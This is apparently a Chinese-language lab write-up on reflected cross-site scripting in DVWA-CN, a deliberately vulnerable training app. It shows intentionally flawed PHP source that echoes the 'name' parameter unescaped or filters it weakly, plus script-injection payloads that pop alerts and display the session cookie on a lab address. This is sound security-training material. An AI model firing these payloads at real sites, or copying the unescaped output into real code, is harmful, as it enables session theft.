#dvwacn之三反射型xss

dvwacn之反射型xss物理路径

```
root@webserver:/var/www/dvwacn/vulnerabilities/xss_r/source# ls
high.php  low.php  medium.php
```

##安全级别

- low.php

```
<?php

if(!array_key_exists ("name", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){

 $isempty = true;

} else {
		
 $html .= '<pre>';
 $html .= 'Hello ' . $_GET['name'];
 $html .= '</pre>';
	
}
```

- medium.php 

```
<?php

if(!array_key_exists ("name", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){

 $isempty = true;

} else {

 $html .= '<pre>';
 $html .= 'Hello ' . str_replace('<script>', '', $_GET['name']);
 $html .= '</pre>'; 

}
```


- high.php

``` 
<?php
	
if(!array_key_exists ("name", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){
	
 $isempty = true;
		
} else {
	
 $html .= '<pre>';
 $html .= 'Hello ' . htmlspecialchars($_GET['name']);
 $html .= '</pre>';
		
}
```

low.php中name参数未经任何处理，直接返回用户提交数据

```
$_GET['name']
```

反射型xss地址

http://192.168.56.80/dvwacn/vulnerabilities/xss_r/


用户输入：

```
<script>alert('xss')</script>
```

页面返回弹窗内容'xss'


##反射型跨站测试

http://192.168.56.80/dvwacn/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(%27%B7%B4%C9%E4%D0%CD%BF%E7%D5%BE%B2%E2%CA%D4%27)%3C/script%3E

页面弹窗

```
反射型跨站测试
```

url解码

```
http://192.168.56.80/dvwacn/vulnerabilities/xss_r/?name=<script>alert('反射型跨站测试')</script>
```


##获取用户cookie

输入

```
<script>alert(document.cookie)</script>
```

页面返回当前用户cookie

```
security=low; PHPSESSID=5538rj2euqbbdrsfsh3lrtnlg2
```

url地址

http://192.168.56.80/dvwacn/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E#

url解码

```
http://192.168.56.80/dvwacn/vulnerabilities/xss_r/?name=<script>alert(document.cookie)</script>#
```